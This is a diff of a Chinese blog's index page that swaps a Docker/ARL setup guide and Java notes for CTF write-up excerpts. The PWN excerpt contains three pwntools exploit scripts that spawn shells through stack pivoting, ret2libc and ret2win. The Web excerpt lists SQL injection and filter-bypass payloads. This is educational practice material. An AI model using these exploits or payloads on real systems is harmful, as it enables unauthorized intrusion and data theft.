@@ -117,11 +117,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2025/12/30/ARL食用指南/" >ARL食用指南</a>
+			<a href="/2026/01/20/BUUCTF-PWN/" >PWN合集</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2025-12-30  </div>
+		<div class="date">post @ 2026-01-20  </div>
 		</div>
 	</div>
 	
@@ -131,41 +131,23 @@
   <div class="row">
 	
 	
-		<h2 id="0x01-部署前环境准备"><a href="#0x01-部署前环境准备" class="headerlink" title="0x01.部署前环境准备"></a>0x01.部署前环境准备</h2><ol>
-<li><p><strong>核心依赖：Docker + Docker Compose（插件版）</strong><br>Kali 2025 默认预装 Docker，但需确认 <strong>Docker Compose 插件版</strong> 可用（避免独立包冲突）：</p>
- <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证 Docker 是否运行</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl status docker</span><br><span class="line"><span class="comment"># 验证 Docker Compose 插件版（无横杠，官方推荐）</span></span><br><span class="line">docker compose version</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>Docker Compose 安装冲突（独立包 vs 插件版）</strong></p>
-<ul>
-<li>现象：执行 <code>sudo apt install docker-compose</code> 时提示“trying to overwrite…”</li>
-<li>解决：使用系统预装的插件版，无需安装独立包；若已安装独立包，先卸载冲突组件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 卸载冲突的独立包</span></span><br><span class="line"><span class="built_in">sudo</span> apt remove -y docker-compose</span><br><span class="line"><span class="comment"># 确保插件版可用</span></span><br><span class="line"><span class="built_in">sudo</span> apt install -y docker-compose-plugin</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="0x02-配置-Docker-国内加速器"><a href="#0x02-配置-Docker-国内加速器" class="headerlink" title="0x02.配置 Docker 国内加速器"></a>0x02.配置 Docker 国内加速器</h2><p>Docker 默认拉取国外镜像源，必须配置国内加速器（你遇到过格式错误、源不稳定问题）。</p>
-<ol>
-<li><p><strong>编辑 Docker 配置文件</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件（若不存在则自动创建）</span></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>写入正确格式的加速源</strong><br><strong>正确配置（含国内稳定源）</strong>：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;https://docker.m.daocloud.io&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker.1panel.live&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://hub.rat.dev&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://docker.xuanyuan.me&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://registry.cn-hangzhou.aliyuncs.com&quot;</span>  </span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+		<h2 id="ciscn-2019-es-2-普通栈迁移"><a href="#ciscn-2019-es-2-普通栈迁移" class="headerlink" title="ciscn_2019_es_2(普通栈迁移)"></a>ciscn_2019_es_2(普通栈迁移)</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+  &lt;-- s起始地址 = ebp_vul - 0x28（低地址）</span><br><span class="line">| s[0] ~ s[0x27]         |  s数组（0x28字节）</span><br><span class="line">+------------------------+  &lt;-- s终止地址 = ebp_vul（高地址）</span><br><span class="line">| 溢出数据               |  覆盖ebp_vul和ret</span><br><span class="line">+------------------------+  &lt;-- ebp_vul（vul的栈底指针）</span><br><span class="line">| ebp_main               |  保存的main函数的ebp（vul栈中存储位置：ebp_vul + 4）</span><br><span class="line">+------------------------+</span><br><span class="line">| ret_addr（返回main）    |  vul执行完后返回main的地址（位置：ebp_vul + 8）</span><br><span class="line">+------------------------+</span><br><span class="line">| ...                    |  main函数的栈数据</span><br><span class="line">+------------------------+  &lt;-- ebp_main（main的栈底指针）</span><br><span class="line">| main的局部变量/参数     |</span><br><span class="line">+------------------------+  &lt;-- 更高地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-</li>
-<li><p><strong>使加速配置生效</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新加载配置</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="comment"># 重启 Docker 服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br><span class="line"><span class="comment"># 验证加速源是否生效</span></span><br><span class="line">docker info | grep <span class="string">&quot;Registry Mirrors&quot;</span> -A 5</span><br></pre></td></tr></table></figure>
-<ul>
-<li>生效标志：输出中显示配置的所有加速源。</li>
-</ul>
-</li>
-</ol>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移: 往低地址栈迁移</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;&quot;, )</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">b&quot;a&quot;</span>* (<span class="number">0x28</span> - <span class="number">1</span>) + <span class="string">b&quot;b&quot;</span>  </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line">io.send(payload_leak) <span class="comment"># 注意不要用sendline 因为 0x28已经覆盖s字符数组的所有空间，即s数组最后的\x00也被覆盖了</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;b&quot;</span>) <span class="comment"># 定位字符，便于接收ebp</span></span><br><span class="line"></span><br><span class="line">ebp_main = u32(io.recv(<span class="number">4</span>))  <span class="comment"># 覆盖到ebp_vul 打印的内容即为：[ebp_vul] = ebp_main</span></span><br><span class="line">log.success(<span class="string">f&quot;ebp_main:<span class="subst">&#123;<span class="built_in">hex</span>(ebp_main)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用变量s作为迁移栈</span></span><br><span class="line"><span class="comment"># 1.确定 ebp_vul 与 ebp_main 的偏移关系 调试可知：ebp_vul_addr = ebp_main_addr - 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 main 函数调用 vul 之前设置断点，记录此时的 ebp（即 ebp_main）。</span></span><br><span class="line"><span class="comment"># 单步进入 vul 函数，在 vul 函数的栈帧初始化完成后（即执行完 push ebp; mov ebp, esp 后），记录此时的 ebp（即 ebp_vul）。</span></span><br><span class="line"><span class="comment"># 计算两者的差值：偏移 = ebp_main - ebp_vul（因为栈从高地址向低地址增长，ebp_main 地址高于 ebp_vul）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.确定 s的起始地址 与 ebp_vul 的偏移关系 ida可知：s的起始地址 = ebp_vul_addr - 0x28</span></span><br><span class="line"><span class="comment"># 3. s_addr = ebp_vul - 0x28 = (ebp_main - 0x10) - 0x28</span></span><br><span class="line">stack_addr =  ebp_main - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = stack_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload_attack = p32(<span class="number">0xdeadbeef</span>) <span class="comment"># 被leave指令的pop ebp读取，赋值给ebp（垃圾值，无实际作用）</span></span><br><span class="line">payload_attack += p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">payload_attack += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload_attack = payload_attack.ljust(<span class="number">0x28</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload_attack += p32(stack_addr) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload_attack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 <hr>
-<h2 id="0x03-拉取-ARL-代码"><a href="#0x03-拉取-ARL-代码" class="headerlink" title="0x03.拉取 ARL 代码"></a>0x03.拉取 ARL 代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ki9mu/ARL-plus-docker.git ./ARL</span><br><span class="line"><span class="built_in">cd</span> ARL</span><br></pre></td></tr></table></figure>
+<h2 id="pwn2-sctf-2016-整数溢出-ret2libc"><a href="#pwn2-sctf-2016-整数溢出-ret2libc" class="headerlink" title="pwn2_sctf_2016(整数溢出+ret2libc)"></a>pwn2_sctf_2016(整数溢出+ret2libc)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;node5.buuoj.cn&quot;, 25588)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2_sctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">prinf_plt = elf.plt[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;How many bytes do you want me to read? &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;data!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x2C</span> + <span class="number">4</span>)</span><br><span class="line">payload_leak += p32(prinf_plt) + p32(main_addr) + p32(printf_got)</span><br><span class="line"></span><br><span class="line">io.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">f&quot;printf_addr:<span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;printf&quot;</span>, printf_addr)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload_attack = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x2C</span> + <span class="number">4</span>)</span><br><span class="line">payload_attack += p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;How many bytes do you want me to read? &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;data!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload_attack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 待议</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="wustctf2020-getshell-最简单栈溢出"><a href="#wustctf2020-getshell-最简单栈溢出" class="headerlink" title="wustctf2020_getshell(最简单栈溢出)"></a>wustctf2020_getshell(最简单栈溢出)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27531</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./wustctf2020_getshell&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = elf.symbols[<span class="string">&quot;shell&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x18</span>  + <span class="number">4</span>) + p32(shell_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <hr>
 	
 	</div>
-  <a type="button" href="/2025/12/30/ARL食用指南/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/2026/01/20/BUUCTF-PWN/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -175,11 +157,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2025/12/30/Java基础/" >Java基础</a>
+			<a href="/2026/01/13/BUUCTF-Web/" >Web合集</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2025-12-30  </div>
+		<div class="date">post @ 2026-01-13  </div>
 		</div>
 	</div>
 	
@@ -189,130 +171,22 @@
   <div class="row">
 	
 	
-		<h2 id="一、Java虚拟机与平台特性"><a href="#一、Java虚拟机与平台特性" class="headerlink" title="一、Java虚拟机与平台特性"></a>一、Java虚拟机与平台特性</h2><h3 id="1-JVM架构详解"><a href="#1-JVM架构详解" class="headerlink" title="1. JVM架构详解"></a>1. JVM架构详解</h3><ul>
-<li><p><strong>类加载器子系统</strong>：</p>
-<ul>
-<li>启动类加载器（Bootstrap）：加载<code>rt.jar</code>等核心库</li>
-<li>扩展类加载器（Extension）：加载<code>jre/lib/ext</code>目录</li>
-<li>应用类加载器（Application）：加载<code>CLASSPATH</code>路径</li>
-<li>自定义类加载器：继承<code>ClassLoader</code>实现热部署</li>
-</ul>
-</li>
-<li><p><strong>运行时数据区</strong>：</p>
-<p><img src="/images/Java%E5%9F%BA%E7%A1%80/image_1.png" alt="在这里插入图片描述"></p>
-</li>
-<li><p><strong>垃圾回收机制</strong>：</p>
-<ul>
-<li><strong>分代收集</strong>：新生代（Eden+S0+S1）和老年代</li>
-<li><strong>GC算法</strong>：<ul>
-<li>标记-清除：产生内存碎片</li>
-<li>复制算法：适用于新生代（90%对象存活率低）</li>
-<li>标记-整理：适用于老年代</li>
-</ul>
-</li>
-<li><strong>常见GC器</strong>：<ul>
-<li>Serial：单线程，适合客户端应用</li>
-<li>Parallel：多线程吞吐量优先</li>
-<li>CMS：低延迟，但会产生碎片</li>
-<li>G1：分区收集，预测停顿时间</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="2-跨平台原理"><a href="#2-跨平台原理" class="headerlink" title="2. 跨平台原理"></a>2. 跨平台原理</h3><ul>
-<li><strong>字节码文件</strong>（<code>.class</code>）：<ul>
-<li>由Java编译器生成，与操作系统无关</li>
-<li>包含：常量池、字段表、方法表、属性表</li>
-</ul>
-</li>
-<li><strong>JVM执行过程</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>编译后字节码（<code>javap -c Test.class</code>）：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(java.lang.String[]);</span><br><span class="line">  Code:</span><br><span class="line">     0: getstatic     #2  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">     3: ldc           #3  // String Hello</span><br><span class="line">     5: invokevirtual #4  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">     8: return</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="二、基础语法与数据类型"><a href="#二、基础语法与数据类型" class="headerlink" title="二、基础语法与数据类型"></a>二、基础语法与数据类型</h2><h3 id="1-基本数据类型解析"><a href="#1-基本数据类型解析" class="headerlink" title="1. 基本数据类型解析"></a>1. 基本数据类型解析</h3><table>
-<thead>
-<tr>
-<th>基本类型</th>
-<th>包装类</th>
-<th>大小</th>
-<th>默认值</th>
-<th>取值范围</th>
-<th>特殊说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>byte</code></td>
-<td><code>Byte</code></td>
-<td>1字节</td>
-<td>0</td>
-<td>-128~127</td>
-<td>适合存储小整数</td>
-</tr>
-<tr>
-<td><code>short</code></td>
-<td><code>Short</code></td>
-<td>2字节</td>
-<td>0</td>
-<td>-32768~32767</td>
-<td></td>
-</tr>
-<tr>
-<td><code>int</code></td>
-<td><code>Integer</code></td>
-<td>4字节</td>
-<td>0</td>
-<td>-2^31~2^31-1</td>
-<td>最常用整型</td>
-</tr>
-<tr>
-<td><code>long</code></td>
-<td><code>Long</code></td>
-<td>8字节</td>
-<td>0L</td>
-<td>-2^63~2^63-1</td>
-<td>后缀<code>L</code></td>
-</tr>
-<tr>
-<td><code>float</code></td>
-<td><code>Float</code></td>
-<td>4字节</td>
-<td>0.0f</td>
-<td>±3.40282347E+38F</td>
-<td>后缀<code>f</code></td>
-</tr>
-<tr>
-<td><code>double</code></td>
-<td><code>Double</code></td>
-<td>8字节</td>
-<td>0.0d</td>
-<td>±1.79769313486231570E+308</td>
-<td>默认浮点类型</td>
-</tr>
-<tr>
-<td><code>char</code></td>
-<td><code>Character</code></td>
-<td>2字节</td>
-<td>‘\u0000’</td>
-<td>0~65535</td>
-<td>Unicode字符</td>
-</tr>
-<tr>
-<td><code>boolean</code></td>
-<td><code>Boolean</code></td>
-<td>1位</td>
-<td>false</td>
-<td>true&#x2F;false</td>
-<td>无具体大小</td>
-</tr>
-</tbody></table>
-<p>关键说明</p>
-<ol>
-<li>包装类均为<strong>引用类型</strong>，首字母大写（两个特殊情况：<code>int</code> 对应 <code>Integer</code>、<code>char</code> 对应 <code>Character</code>，其余基本类型直接首字母大写即可）</li>
-<li>包装类主要用于需要使用对象的场景（如集合框架、反射等），可实现基本类型与包装类的自动装箱&#x2F;拆箱</li>
-</ol>
+		<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">万能钥匙：<span class="number">1</span><span class="string">&#x27; or 1=1 -- +qwe 成功闭合</span></span><br><span class="line"><span class="string">测试列数：1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> <span class="comment">-- +qwe 实为2列，超过2报错</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">探测显示位：<span class="number">1</span><span class="string">&#x27; union select 1,2 -- +qwe</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF-Web/image_1.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试一下绕过正则过滤：<span class="number">1</span><span class="string">&#x27; union se%0Alect 1,2 -- +qwe</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF-Web/image_2.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">继续尝试：<span class="number">1</span><span class="string">&#x27; union se%0Alect 1,2 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF-Web/image_3.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">引入一些绕过技巧，当然在这题均失败</span><br><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union se%0Alect 1,2 -- +qwe</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="operator">%</span><span class="number">0</span>Dlect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union se%0Blect 1,2 -- +qwe</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="operator">%</span><span class="number">0</span>Clect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union s%09e%09l%09e%09c%09t%091,2%09--%09qwe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注释绕过：</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="comment">/**/</span>lect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union se/*a*/lect 1,2 -- +qwe</span></span><br><span class="line"><span class="string">	1&#x27;</span> <span class="keyword">union</span> se<span class="comment">/*abc*/</span>lect <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- +qwe</span></span><br><span class="line"></span><br><span class="line">大小写绕过：(这肯定失败： <span class="operator">/</span>i)</span><br><span class="line">	<span class="number">1</span><span class="string">&#x27; union sElEct 1,2 -- +qwe</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>‘正常’ 的select 等不可用，那就尝试一下堆叠注入</p>
+</blockquote>
 	
 	</div>
-  <a type="button" href="/2025/12/30/Java基础/#more" class="btn btn-default more">阅读此文</a>
+  <a type="button" href="/2026/01/13/BUUCTF-Web/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -361,7 +235,7 @@
 <div class="widget-wrap">
   <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
   <div class="widget category-tree">
-    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span 